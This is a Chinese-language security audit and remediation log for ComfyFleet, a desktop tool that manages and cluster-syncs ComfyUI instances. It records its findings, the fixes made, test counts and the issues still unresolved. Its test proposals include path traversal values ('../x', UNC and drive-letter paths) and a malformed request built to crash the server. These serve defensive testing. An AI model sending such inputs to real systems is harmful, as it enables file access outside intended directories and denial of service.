4. **remote host 只在保存时校验**：手工编辑/同步的 `instance.json` 里的 remote.host 不会在 load 时重新走 `normalize_remote_host`；目前 `instance_open_url` 只在本地配置可信时安全，属于 defense-in-depth 缺口。
5. **`allowDirtyTarget` 是刻意设计，不是 bug**：前端确认页明确写“按源端完整状态覆盖，不再比较差异”，后端 [`commands/cluster.rs:1135`](src-tauri/src/commands/cluster.rs#L1135) 强制 true、[`1098`](src-tauri/src/commands/cluster.rs#L1098) 把 drift 置 false。风险是“用户以为还会二次确认，实际直接覆盖”；应保留，但文案要更明确，且最好在确认页标出“本机将丢失的改动数量”。
6. **同步设置是死配置**：见 P2-25；`api.syncPreview*`/`syncStartBatch`/`syncJob(s)` 在 `src/` 无调用方。要么接上 leader 侧预览，要么删掉配置和文案。
7. **测试套件有假阳性**：`cargo test` 180 passed，但 `sync.rs:4170` 等测试语句被注释吞掉，另有多处断言被削弱。修复文本损坏后必须重跑全部集群/同步测试。
8. **`install.py` 默认执行**：即使把全局 `allow_install_script` 设为 false 也不会生效（P2-9）；这是“用户以为关闭了代码执行，实际没有”的典型未明确项。
9. **UI 文案/状态**：`Versions.tsx:377` 让点“刷新”但按钮只在开发版 tab；`Nodes.tsx:573` 说“别关窗口”，而版本页说“关掉不影响后台继续”；`Cluster.tsx` 的 `stateText` 缺 `ready/error/updating/uninitialized`，会显示英文枚举；`Home.tsx` 删除 guard 漏 `stopping`，`InstanceDetail` 启动按钮在 `installing/updating` 仍可点。
10. **`open_path`/`opener:default`/`pty_spawn`**：正常 UI 路径可信，但没有 CSP + 自定义命令全开放时，这些是 XSS 的放大器，建议按 P1-13 收口。

---

## 六、已核对、避免误报的点

- **`instance_id` 多数命令是安全的**：`load_instance` 要求十六进制（[`commands/instance.rs:129-137`](src-tauri/src/commands/instance.rs#L129-L137)），所以 `instance_start/stop/env/deps/version/nodes` 等不存在任意 `..` 路径；例外是 `instance_delete`、`snapshot_list/delete`、`activity::path`、`save_instance`（见 P1-10/P2-1/P2-2）。
- **`allowDirtyTarget`** 是前后端一致的设计，不是“后端偷偷覆盖”；但它确实绕过了 drift 二次确认（见 P3-5）。
- **前端没有发现直接 XSS sink**：全量 grep 未发现 `dangerouslySetInnerHTML`/`innerHTML`/`eval`/`new Function`/`window.open`；日志/名称均按 React 文本渲染。问题在“没有 CSP + IPC 全开放”，不是已存在 XSS。
- **`instance_open_url`** 使用后端拼出的 URL，正常路径不是命令注入；只有在 `instance.json` 被外部篡改时才有边界风险，不应夸大为“远程命令注入”。
- **日志内存有上界**：activity 500、job logs 600、overview 300、xterm scrollback 10k；除 AccelPanel 的 `lines` 未截断外，内存增长不是主要问题；磁盘日志无轮转才是 P3。
- **`cargo test` 不是全绿可信**：180 passed 是事实，但被吞掉的测试语句使其对同步/取消路径没有证明力。
- **`tsc --noEmit` 干净**：前端类型层没有错误；上面的问题主要是状态机/交互/后端契约。

---

## 七、建议修复顺序

1. **先修文本损坏**：恢复第一节 11 行，CI 加“注释吞语句”检查；重新跑全部测试。否则取消/超时/取消栅栏永远是假的。
2. **堵 P0 远程面**：`percent_decode`、sync manifest 路径、`wheel.name`、requirements 校验、node name 校验；这些是“发一个请求/加入一个集群就中招”的等级。
3. **发布阻断**：内置 uv；每实例操作锁；start/stop 状态与 PID 校验；安装超时/取消。
4. **数据安全**：instance_create 共享根、instance_delete 原始 id/运行中删除、nodes_remove 先删后查、快照恢复预览刷新。
5. **进程/安全加固**：PTY 单会话 + 卸载清理、CSP、默认回环绑定/TLS、`install.py` 开关真正生效、uninstaller 数据文案。
6. **前端一致性**：草稿保护、模态可关闭/后台继续、轮询序号、LaunchArgs/Storage/Settings 归一化。

---

## 八、复现与验证建议

- 为 `percent_decode` 加 `#[test]`：`percent_decode("/%中")` 不 panic；用本地 `TcpStream` 发 `GET /%E4%B8%AD`（合法）和 `GET /%中`（触发）区分。
- 为 `sync` 加表驱动测试：`archive` 为 `../x`、`..\\x`、`C:\\x`、`\\\\server\\x`、`env/projects/../../x`，全部拒绝。
- 为 `nodes_remove` 加测试：`name=".."`/`"."`/`"..."` 必须 `NODE_NAME_INVALID`。
- 为 `cancel_job` 加状态机测试：pending→cancelled 后 `next_job` 不可领取；running→cancel_requested；终态清 flag。
- 为 `start_instance` 加并发测试：两个线程同时 start，只能 spawn 一个。
- 为 `stop_instance` 加“taskkill 失败”注入测试：状态必须是 Error/Stopping，不能 Stopped。
- 为 `instance_create` 加“根目录已有其他实例 marker”测试：必须拒绝。
- 为 `snapshot_restore` 前端加测试：缓存预览过期时打开确认框必须重新请求。

---

## 九、修复与验证记录（2026-11-02）

### 9.1 已修复

| 编号 | 修复内容 | 验证 |
|---|---|---|
| 文本损坏 | 恢复 `cluster.rs` 5 处、`sync.rs` 5 处生产语句及 1 处测试语句；取消/超时/取消栅栏重新生效 | `cargo test` 全量通过 |
| P0-1 | `percent_decode` 改为逐字节解析 + `from_utf8_lossy`；非法 `%` 不 panic；新增 UTF-8/畸形输入测试；release `panic` 从 `abort` 改为 `unwind` | 单元测试；release 构建 |
| P0-2/P1-4 | `safe_relative_path` 拒绝空/NUL/反斜杠/冒号/绝对路径/`..`；归档、模型、补丁、wheel 全部走 `inbox_path`；wheel 名先校验再 `remove_dir_all`；远端 requirements 包名/版本白名单 | 表驱动单测；路径穿越测试 |
| P1-2 | 恢复 `cancel_allowed`、`job.cancel_requested` 等语句；下载取消与墓碑清理重新执行 | 取消下载测试通过 |
| P1-3 | `short_chars`/`short_sha` 按字符截断；commit 目标只接受 4–40 位十六进制 | 版本流程测试通过 |
| P1-5 | **默认回环 + 显式开放**：`allow_lan=false` 时只绑定 `127.0.0.1`，创建页需勾选“允许局域网”才监听 `0.0.0.0`；已建集群可一键切换并提示成员离线；加入页/创建页均提示“HTTP + 成员令牌、内容不加密”。**局域网模式仍无 TLS** | 新增 `loopback_cluster_only_advertises_localhost`；集群页冒烟 |
| P1-6 | 打包 `resources/uv.exe`（uv 0.8.8）；`resolve_uv` 优先 exe 同目录 resources；缺失报 `UV_NOT_FOUND` | NSIS 安装包 54.45 MiB；生成脚本含 `resources\uv.exe` |
| P1-7 | 新增每实例 `OpGuard`：安装环境/依赖/节点/加速库/版本切换/启动/停止/删除/快照恢复互斥 | 编译与现有并发/状态测试通过 |
| P1-8 | 启动/停止状态机：启动前重查 runs，拒绝安装/更新/停止中；停止检查 `kill_tree` 与 5 秒退出，失败回滚为 Error 并保留句柄 | 现有状态测试 + 冒烟 |
| P1-9 | `instance_create` 拒绝与已有实例根目录相同/嵌套的路径；`load_instance` 重新校验 remote 地址；通道白名单 `stable/dev` | 新增 `nested_instance_roots_are_rejected`、`channel_is_whitelisted` |
| P1-10 | `instance_delete` 校验 id/清单 id/marker id；运行中拒绝；purge 仅对本地、非导入实例；加 `OpGuard` | 编译与现有测试 |
| P1-11 | 环境安装新增 `env_cancel_install`：安装循环每 500ms 检查取消标志并杀进程树，前端安装弹窗有“取消安装”；版本切换/更新新增 `version_cancel`，在依赖重装阶段可取消并杀 uv 进程树，前端控制台有“取消依赖安装”；`proc::run`/`run_stream` 全部加 45 分钟 deadline + `kill_pid_tree`，子进程退出但管道被孙进程占用时也会收尾 | 新增 `cancelled_before_start_never_spawns`、`stream_kills_child_when_cancelled`（0.69s 内终止 `ping`）；185 测试通过 |
| P1-12 | ComfyUI 先 clone 到 `ComfyUI.install-*`，成功后替换；旧目录移到 `.broken-*`；替换失败回滚旧目录；clone 失败清理 staging；启动时 `Installing/Updating` 转 Error | 编译；路径测试 |
| P1-13 | 启用严格 CSP；移除 `opener:default`；`open_path` 只允许已存在目录；`pty_spawn` 只允许字面 `cmd.exe` | WebView2 逐页冒烟无 CSP/控制台错误 |
| P1-14 | Console 增加 `spawningRef/aliveRef/attachSeqRef`；卸载、切实例、双击、spawn 未返回时均不会泄漏第二个 PTY | `tsc` + 逐页冒烟（控制台页正常） |
| P1-15 | 快照恢复确认总是重新拉 preview；增加 `loadSeq/previewSeq`，切实例清空旧状态 | `tsc` |
| P2-5 | `freeze`/约束文件写失败直接中止版本切换，不再无约束重装 | 版本测试 |
| P2-6 | 更新/切换前快照改为必需，失败返回 `PRE_SNAPSHOT_FAILED` 并中止；post-update 仍 best-effort | 编译 |
| P2-8/9 | git URL 严格校验；`allow_install_script` 全局开关真正生效；禁用节点不参与“全部补依赖” | 节点 URL 测试 |
| P2-11/12 | 加速库只接受 https；wheel 文件名/METADATA 版本/分发名白名单；8 GiB 上限；临时文件校验后改名 | 编译 |
| P2-13/14 | `install.py` 超时杀进程树、输出限 2 MiB；MinGit 解压拒绝 `\`/盘符/UNC/`..`/符号链接，限制条目数、总大小、加锁、校验 marker 版本 | MinGit 解包测试通过 |
| P2-15/16/17 | PTY `Drop` kill；退出时清理 PTY；`cmd_safe` 过滤 CR/LF/NUL；只允许裸 `cmd.exe` | 新增 pty 单测 |
| P2-19/20 | `atomic_write` 唯一临时名 + 失败清理；`set_state` 串行化 | 编译 |
| P2-25 | `sync.removeExtraNodes/Models` 真正作为集群确认页默认值；文案改为“可逐次修改” | `tsc` |
| P2-26/27/28/29 | 集群轮询序号、退出失效；确认目标仅 `ready/stopped`；实例切换 dirty 保护；日志上限实时同步 | `tsc` + 冒烟 |
| P2-30 | NSIS 增加 `installerHooks`：勾选“删除应用数据”时删除 `$INSTDIR\data` | 生成安装包时 `makensis` 通过；生成的 `installer.nsi` 含 hook |
| P2-31/32 | 二次启动 `show()+unminimize()+set_focus()`；日志只读尾部 8 MiB、`lines` 夹到 1–2000 | 编译 |
| P3-1/2/3/4 | 删除 `.rs.new`；`custom` 引擎可编辑不再报 `ENGINE_UNKNOWN`；通道/remote 校验；状态文案补全 | 新增测试 + `tsc` |
| P3-9 | 版本页稳定版也有“刷新”；Home 删除 guard 加 `stopping`；详情页安装/更新/停止中禁用启动；`stateText` 补 ready/error/updating/uninitialized | `tsc` + 冒烟 |

### 9.2 复测结果

- `cargo test --manifest-path src-tauri/Cargo.toml --no-fail-fast`：**185 passed, 0 failed, 5 ignored**。PowerShell 因 cargo 写到 stderr 显示 `exit code: 1`，文本为 `test result: ok`。
- `pnpm exec tsc --noEmit`：无输出（通过）。
- `pnpm run build`：Vite 构建通过；Rust release 编译通过；NSIS 产出 `src-tauri/target/release/bundle/nsis/ComfyFleet_0.1.0_x64-setup.exe`（54.45 MiB / 57,091,549 字节）。
- 以 `--remote-debugging-port=9333` 启动 release 版，通过 CDP 检查：首页、概览、控制台、节点、版本、启动参数、存储、快照、日志、设置均可打开；集群创建页显示“允许局域网内的其他机器加入”且默认不勾选；无 `Runtime.exceptionThrown` / CSP 报错；9 个标签仍是“透明居中、激活项实心主色块、无侧栏/无数字键帽/无下划线”。

### 9.3 仍未解决（明确告知，不假装已修）

1. **局域网模式无 TLS（P1-5）**：默认已只监听 `127.0.0.1`，跨机器必须显式勾选“允许局域网”，并看到明文 HTTP 警告；但一旦开放，令牌和同步内容仍是明文。要彻底解决需要 TLS/证书固定，或统一要求 VPN/SSH 隧道；不能靠路径校验替代。
2. **P2-1 复核后不成立**：`snapshot_list/delete` 先走 `validate_instance_id`（仅十六进制），路径固定在 `app_root/snapshots/<id>`，无法越界；为保留“实例删除后仍可清理孤立快照”的能力，没有强制 `load_instance`。
3. **未在真实安装/卸载上执行 NSIS**：为避免动当前用户数据，只验证了生成脚本包含 hook 且 `makensis` 编译成功；卸载删除 `$INSTDIR\data` 的实际行为建议在测试机点一次“卸载 + 删除应用数据”。
4. **`cargo fmt` / `cargo clippy` 未运行**：当前工具链没装 `rustfmt`/`clippy` 组件；没有为了格式化去动整个代码库。

*报告结束。源码已按上述记录修改；`CODE_AUDIT.md` 保留原始审计发现并追加本修复记录。*

---

## 十、第二轮全量审查与真实业务复测（2026-11-03）

### 10.1 本轮新发现并修复

| 编号 | 问题 | 修复 | 验证 |
|---|---|---|---|
| A-1 | 快照把 wheel URL 里的 `%2B` 原样存成包版本（真实快照中 `llama-cpp-python=0.4.5%2Bcu130`），恢复/补包会安装不存在的版本 | `version_from_url` 解码 `%2B`；`plan_packages` 与恢复安装参数统一 `percent_decode`；加载旧快照时归一化，旧数据也能恢复 | 新快照 JSON 为 `0.4.5+cu130`；单测 `package_plan_normalizes_percent_encoded_local_version` |
| A-2 | 安装结束写状态失败时仍返回成功，界面会永远停在“安装中” | 开始安装和结束写状态都传播 `STATE_SAVE_FAILED`，不再 `let _ = save_instance` | 编译 + 单测 |
| A-3 | `recover_orphans` 把“记录缺失/损坏但进程可能还活着”直接改成 Stopped，用户再启动会撞端口 | 运行记录缺失/损坏时标记 `Error`，不再谎报停止 | 单测 + 启动复查 |
| A-4 | `proc::run` 子进程退出后无限等读线程；`try_wait` 出错不杀子进程 | 读线程最多等 2 秒后放弃；`try_wait` 出错先杀进程树再报错 | 单测 |
| A-5 | `has_pip`、`git ls-remote` 用 `.output()` 无超时 | 改走带 45 分钟 deadline 的 `proc::run` | 编译 |
| A-6 | `instance_update`、`instance_launch_update`、`instance_storage_update`、`instance_env_refresh` 未拿实例操作锁，可与安装/启动并发写配置 | 统一 `OpGuard`；同步应用用 `stop_instance_unlocked` 并加 `SyncApplyingGuard` | `cargo test --lib` 205 passed |
| A-7 | 实例根目录只规范化一层，符号链接/`..` 可绕过导入和 purge 的嵌套检查 | `normalized_root` 递归找最近存在祖先并去 `\\?\`；`instance_import`/`instance_delete(purge)` 共用 `ensure_root_isolated` | 新增根目录重叠测试 + 真实创建嵌套根被 `ROOT_OVERLAP` 拒绝 |
| A-8 | 快照恢复时“空包清单”会把虚拟环境里所有非保护包卸掉；`clean_to_commit` 在目标 commit 不存在时先 reset 再失败 | 空清单跳过包恢复；reset/clean 前 `git cat-file -e <commit>^{commit}` 预检 | 单测 |
| A-9 | 集群多个 handler 持有配置锁写 HTTP 响应，慢客户端会卡住心跳/其他成员 | `confirm/reject/progress` 等路径在 `json_response` 前 `drop(cfg)`；`serve_model` 校验 generation id | 编译 |
| A-10 | 多处用字节下标截断中文（版本/diff/checkout 消息），可能 panic | 统一 `sync::short_chars` | 中文版本消息回归 |
| A-11 | Home 直接启动绕过实例的 `nodeDepsAuto`；Settings 保存会把并发修改的端口/启动参数写回旧值；Console 改名会重连 PTY | Home 启动前按 off/remind/auto 处理依赖；Settings 保存不再发送 server 字段；Console 改名只更新标签，不重挂 PTY | 真实 UI 操作 |
| A-12 | 存储页有重复挂载计划、外部同步会覆盖用户草稿；启动参数保存会丢同行的其他参数 | 单一 plan effect；`inst.storage` 外部更新只在无草稿时跟随；启动参数按行合并 | 真实 UI 操作 |
| A-13 | `InfoTip.tsx` 无任何引用；`snapshot` 的 `MAX_AUTO` 只被测试使用却导出；Triton 对照表/辅助函数只被单测使用 | 删除 `InfoTip.tsx`；`MAX_AUTO` 移入测试模块；`TRITON_BY_TORCH`/`triton_spec`/`triton_wheels` 标记 `#[cfg(test)]` | `pnpm typecheck` + release 构建 0 warning |

### 10.2 真实业务测试（全部在项目内临时实例执行，未动 `D:\ComfyUI` 和用户实例 A）

1. **设置页**：改环境变量 `B=2 / A=1` 保存后仍停在“设置”，脏点清空，配置持久化为 `{A:1,B:2}`；把启动端口改为 8190 后再保存设置，端口仍为 8190，未被旧草稿覆盖。
2. **启动参数**：端口 8189→8190→8191→8190 往返保存，`instance.json` 与实际启动参数同步；启动命令显示 `--port` 正确。
3. **终端**：打开 PTY 后会话显示“已连接”，把实例改名 `AuditTest→AuditTest2→AuditTest`，PTY 未重连、未断开。
4. **启动/停止/健康**：真实启动 ComfyUI，`instance_health` 返回显存/内存/队列；停止后 8189 端口无监听、无 python 进程；运行中删除返回 `INSTANCE_RUNNING`。
5. **自动重启**：开启“进程退出后自动重启”，启动后强杀 python PID，约 14 秒出现新 PID，最终状态回到 `running`。
6. **存储**：读取共享模型/输入/输出计划，关闭再打开“使用全局共享模型目录”分别保存，`instance.json` 正确；保存期间无重复挂载计划。
7. **快照**：创建 56 节点 / 310 包的真实快照；展开详情、恢复预览显示启动参数 `8191→8190`；真实恢复完成报告“启动参数已恢复：127.0.0.1:8190”，端口回 8190，并自动生成 `pre-restore` 快照；旧快照的 `%2B` 版本已在新构建中解码。
8. **节点依赖**：`nodes_deps_status` 对 56 个节点返回 `pendingNodes=0`，节点页正确区分“依赖已齐”和“有 install.py”；禁用/启用、更新按钮状态正常。
9. **版本**：版本页读到 60 个可用版本、当前 `v0.43.2`、提交 `423cbd2`、工作区干净；未执行会重装数 GB 依赖的切换。
10. **导入/删除**：重复导入同一根目录返回 `ALREADY_REGISTERED`；导入实例 `purge=true` 返回 `PURGE_IMPORTED`；运行中删除被拒；非 purge 删除成功。
11. **创建/清理**：创建新实例 `AuditCreate` 生成 `.comfyfleet\.instance` 标记；在其子目录创建第二个实例返回 `ROOT_OVERLAP`；`purge=true` 删除后目录和登记都消失。
12. **构建与部署**：`cargo test --lib` **205 passed, 0 failed, 5 ignored**；`pnpm typecheck` 通过；`pnpm build` release + NSIS 成功；部署到 `D:\project\ComfyFleet`，CDP 重启后仅剩用户实例 A，首页/详情/设置/存储/快照/节点/版本页均正常。

### 10.3 仍未解决（明确告知）

1. **局域网模式仍无 TLS**（原 P1-5）：默认只监听 `127.0.0.1`，跨机需显式勾选并接受明文 HTTP 警告；令牌和同步内容仍未加密。
2. **集群仍有少量错误分支持锁写响应**：成功路径已 `drop(cfg)`，但 404/409 等早退分支还在锁内 `error_response`；慢客户端仍可能短暂阻塞。
3. **环境安装/`uv venv` 的 `.output()` 仍不能取消**：已通过 `proc::run` 加 45 分钟上限，但不像 `run_stream` 那样每 500ms 检查取消标志。
4. **快照迁移/节点归档的极端命名冲突、同步 generations/backups GC** 未做完整重写；当前只在真实数据上验证了创建/恢复/删除主路径。
5. **NSIS 卸载“删除应用数据”** 仍未在真实安装上点过；只验证了脚本和打包成功。

### 10.4 最终基线

- Rust：`cargo test --lib` 205 passed / 0 failed / 5 ignored。
- 前端：`pnpm typecheck` 无错误；`pnpm build` 通过。
- 部署产物：`D:\project\ComfyFleet\comfyfleet.exe`、`D:\project\ComfyFleet\ComfyFleet_0.1.0_x64-setup.exe`。
- 测试数据：临时实例 `AuditTest`、`AuditCreate`、`ComfyUI-test`、`_audit_instance`、`_audit_tmp` 均已清理；保留用户实例 A 与 `D:\ComfyUI`。

---

## 十一、真实业务补测：安装、版本、节点、存储、集群（2026-11-03）

### 11.1 补测中确认并修复

| 编号 | 问题 | 修复 | 真实复测 |
|---|---|---|---|
| A-14 | 环境安装取消后状态变成 `error`，详情页用 `state !== uninitialized` 判断“已安装”，导致“安装环境”重试按钮消失、启动按钮仍可点 | `installed` 改为按 `comfy.version` 是否存在判断；Home 启动同样以版本为门槛；Error 无核心时显示重试入口 | 取消在 40% 后出现“安装环境”，重试成功到 100% |
| A-15 | `install.allowInstallScript` 没有全局 UI，旧配置为 false 时节点页勾着“运行 install.py”却永远不会执行；跳过后报告只写“已完成” | 全局“运行”页新增“允许节点运行 install.py”；`deps` 报告 warnings 明确写出“全局设置禁止运行 install.py，本次只处理 requirements.txt” | 关闭时看到警告；打开后 `install-marker.txt` 生成，报告“install.py 完成” |
| A-16 | 节点 requirements 已齐但仍有 `install.py` 时，“补依赖”按钮被 `depsSettled` 禁用，无法单独重跑安装脚本 | `depsSettled` 增加 `&& !d.hasInstallPy` | 依赖已齐时按钮仍可点，install.py 成功执行 |
| A-17 | 快照页对“最新”快照隐藏恢复按钮和差异；改了端口/节点后，最新快照恰恰是唯一回滚点却无法使用 | 去掉 `!isLatest` 限制，最新快照也显示差异和“恢复到这一刻” | 改端口 8193 后恢复最新 8191 快照，预览和结果都正确 |
| A-18 | 集群 `join` 在处理错误密码/同名成员时仍持有配置锁写 401/409，慢客户端会阻塞心跳；同名检查与最终写入之间还有竞态 | 密码校验只短暂取 `join_key`；同名检查移到最终写锁内，发现重复先 `drop(cfg)` 再写 409 | 真实重复加入第二次返回 409，随后心跳/删除正常 |

### 11.2 真实业务补测证据

1. **环境安装（从零）**：项目内新实例 `Round2Test`，UI 点“安装环境”真实执行创建 venv、torch 2.10.0+cu130、克隆 ComfyUI、安装 85 个依赖、校验；进度 0→100%，最终 `state=ready`、`comfy.version=v0.43.2`。
2. **取消与重试**：安装到 torch 阶段 40% 点“取消安装”，状态变 `error`、uv/python 进程全部退出；修复后重新出现“安装环境”，重试成功。
3. **启动/健康/停止**：启动后 `running`，`instance_health` 返回 RTX 5090 显存 4.9/31.8 GB、内存、队列；实际命令行包含 `--port 8191 --extra-model-paths-config ... --input-directory ... --output-directory ...`；停止后无残留 python 进程。
4. **版本切换**：真实从 `v0.43.2` 切到 `v0.43.1`，再切回 `v0.43.2`；工作区保持干净，自动生成 post-update 快照，依赖按新 requirements 重装完成。
5. **快照跨版本恢复**：恢复 `v0.43.1` 快照，预览显示 4 个包版本差异，真实恢复完成（`423cbd2 → 086099f`、装/换 4 个包）；再点“回滚到恢复前”回到 `v0.43.2`；最新快照恢复端口 8193→8191 成功。
6. **节点**：真实从 GitHub 安装 `ComfyUI-Custom-Scripts`，更新、禁用/启用、删除；添加 `requirements.txt`（pyperclip）后真实安装成功（包 87→88），`install.py` 在全局开关打开后真实执行并写标记文件；关闭开关时报告明确警告跳过。
7. **存储/启动参数**：切换共享模型开关并保存，生成 `extra_model_paths.yaml`；输入/输出改为自定义目录，重启后实际命令行包含两个 `--*-directory`；端口 8191→8192→8191、附加 `--disable-auto-launch` 往返保存并真实启动验证。
8. **集群**：创建本地集群 `Round2Cluster:8899`，`/api/v1/ping` 返回协议 2；模拟成员用 PBKDF2 挑战应答真实加入，token 心跳/拉任务/成员状态成功；错误 proof 返回 401 且 nonce 不可重放；成员 leave 后 token 失效；错误密码删除被拒，正确密码删除后端口关闭、状态回到 `none`。
9. **构建/测试**：`cargo test --lib` **205 passed, 0 failed, 5 ignored**；`pnpm build` 触发 `tsc --noEmit` 通过，release + NSIS 成功。

### 11.3 仍未解决（与 10.3 相同，未假装修复）

1. 局域网集群仍无 TLS：默认只监听 `127.0.0.1`，跨机需显式开启并接受明文 HTTP。
2. 环境安装的 `uv venv`/`uv --version` 仍使用带超时的 `.output()`，取消要等当前短步骤结束，不能像 `run_stream` 每 500ms 中断。
3. 集群其他少量 404/409 早退分支仍可能在配置锁内写响应；本次已修复 `join` 的密码错误/同名成员分支，正常成功路径均已释放锁。
4. 快照迁移/节点归档极端命名冲突、同步 generations/backups GC 未完整重写。
5. NSIS 卸载“删除应用数据”仍未在真实安装上点过。

### 11.4 当前产物

- `D:\project\ComfyFleet\comfyfleet.exe`
- `D:\project\ComfyFleet\ComfyFleet_0.1.0_x64-setup.exe`
- 测试实例 `Round2Test` 已 `purge` 删除；测试目录 `_round2_instance`、`_round2_io`、`_audit_tmp` 已清理；用户实例 A 与 `D:\ComfyUI` 未动。

---

## 十二、本机双客户端集群同步全流程实测（2026-11-03）

### 12.1 测试拓扑

为避免单实例互斥，构建了同一份代码的第二个可执行文件（临时 identifier `com.yh.comfyfleet.auditmember`），两个进程各自使用独立的 `COMFYFLEET_DATA_DIR`：

- Leader：原 identifier，`_cluster_tmp\leader-data`，集群端口 `8897`，源实例 `ClusterSrc`（`2aec8934`）。
- Follower：独立 identifier，`_cluster_tmp\follower-data`，成员 `Follower-PC`，目标实例 `ClusterDst`（`4e6ef9e7`）。
- 两边各克隆 ComfyUI commit `6b904b5fafd`，各自建 Python 3.13 venv；源端装 `requests==2.32.3`，目标端装 `2.31.0`。
- 源端新增 `ClusterNode`、2 MiB 模型 `cluster-src.safetensors`，并修改 tracked `README.md`（验证 dirty patch）。
- 目标端预置额外节点 `TargetOnlyNode`、额外模型 `target-extra.safetensors`（验证保留/清理选项）。

### 12.2 新发现并修复

| 编号 | 问题 | 修复 | 真实复测 |
|---|---|---|---|
| A-19 | ComfyUI 本体一致性哈希按原始字节计算；Git/autocrlf 换行差异会让源/目标内容完全相同却永远判定 `core.changed=true`，第二次同步可能重复应用补丁 | 目录一致性哈希对文本文件忽略 `CR`，二进制（含 NUL）仍按原字节；下载载荷校验不变；新增 `core_hash_ignores_crlf_line_endings` 单测 | 修复后同一对目录 `core.changed=false`，全量同步报告不再出现“目标工作区哈希与源端不一致” |
| A-20 | “删除目标多余模型”只从默认模型库删除；目标模型实际在实例自己的 `ComfyUI/models` 或附加目录时，删除成功但文件仍在，diff 永远存在 | 清理时遍历 `storage::plan` 的所有生效模型目录；更新模型时优先覆盖目标实际存在的那一份，避免写共享库后旧文件仍被扫描到 | 目标额外模型真实被删除；再次 compare `needsApply=false`、`models.removed=0` |

### 12.3 真实同步结果

1. **全量同步（ComfyUI + Python + 节点 + 模型）**：源端 dirty patch、requests `2.31.0→2.32.3`、节点 `ClusterNode` 新增、2 MiB 模型新增全部真实应用；目标端额外节点/模型按默认选项保留。
2. **核心补丁**：目标 `README.md` 出现与源端相同的修改；修复换行哈希后 `core.changed=false`。
3. **Python**：目标 venv 实际 `requests 2.32.3`；目标实例同步后 `state=stopped`、生成 pre/post 快照。
4. **节点/模型更新**：修改源端模型内容与 `ClusterNode/__init__.py` 后再同步，目标模型 SHA-256 与源端一致，目标节点文件含新内容。
5. **清理选项**：`removeExtraNodes=true` 删除 `TargetOnlyNode`；`removeExtraModels=true` 删除 `target-extra.safetensors` 和 3 GiB 的 `cancel-test.safetensors`，compare 归零。
6. **拒绝**：目标端 `reject` 后任务为 `cancelled`，Leader/Follower 都显示“目标端拒绝同步”。
7. **取消/续传**：3 GiB 模型传输到约 978 MiB 时取消，任务 `cancelled`；再次同步从约 45% 继续（日志显示 `1.4 GiB/3.0 GiB`），最终完整传输，SHA-256 与源端一致，`.part` 被清理。
8. **离线保护**：停止 Follower 超过 45 秒后成员 `online=false`，Leader 发起同步返回 `SYNC_TARGET_OFFLINE`；重启 Follower 后心跳自动恢复 `online=true`。
9. **双端状态**：Leader/Follower 的 job 状态、进度、日志、报告一致；目标 `lastApplied` 为 `ClusterSrc`；`cluster_compare` 显示 `needsApply=false`、`core.changed=false`、节点/模型差异全为 0。

### 12.4 测试与构建基线

- `cargo test --lib`：**206 passed / 0 failed / 5 ignored**（新增换行哈希回归后）。
- 双客户端真实同步完成后，最终用同一份源码重新构建 Leader/Follower 并复测；测试数据 `_cluster_tmp` 在收尾时删除。
- 仍需注意：ComfyUI 完整归档（目标无 `.git` 时的 clone/overlay）未单独构造验证；本轮覆盖的是真实 dirty patch 路径、节点/模型归档、Python 包、取消/续传和拒绝/离线路径。

---

## 十三、同步缓存保留策略与占用展示（2026-11-03）

### 13.1 新增

- 全局设置「同步与快照」新增 **同步缓存保留次数**：默认 `5`，范围 `1..=100`；旧配置缺字段时自动用默认 5。
- 同页显示 **当前同步缓存大小** 和明细：代次 / 收件箱 / 备份 / 节点缓存。
- 新增后端命令 `sync_cache_info`；设置保存后界面立即重新统计。

### 13.2 清理规则

- 按最近同步保留 `data\sync\generations`、`data\sync\inbox`、`data\sync\backups` 各 N 组；
- 正在等待确认、排队或运行中的任务（代次/任务 ID）永不删除；
- 启动时、保存设置时、源端创建新同步任务后、目标端任务结束后各执行一次；
- `node-cache` 和 `hash-cache.json` 是跨任务复用的缓存，不按同步次数清理；
- 删除前按目录递归统计释放字节，失败只记日志，不影响设置保存。

### 13.3 验证

- 生产数据实测：默认设置读出 `syncCacheKeep=5`，`sync_cache_info` 返回 `totalBytes=17,641,894,061`（代次 4 个 / 14,256,470,114 B，节点缓存 3,382,159,359 B），界面显示 `16.4 GB`。
- `cargo test --lib`：**208 passed / 0 failed / 5 ignored**（新增保留策略与缓存统计测试）。
- `pnpm typecheck` 通过；release + NSIS 构建通过。

### 13.4 自动快照默认上限改为 20

- `SyncSettings.snapshot_max` 默认值从 `200` 改为 `20`，界面缺省回退同步改为 `20`。
- 设置版本升到 `2`：旧配置若仍是 v1 且值正好是旧默认 `200`，加载时迁到 `20`；用户主动改成其它值的保留。
- 新增 `old_default_snapshot_limit_migrates_to_20` 测试；`cargo test --lib` 更新为 **209 passed / 0 failed / 5 ignored**。
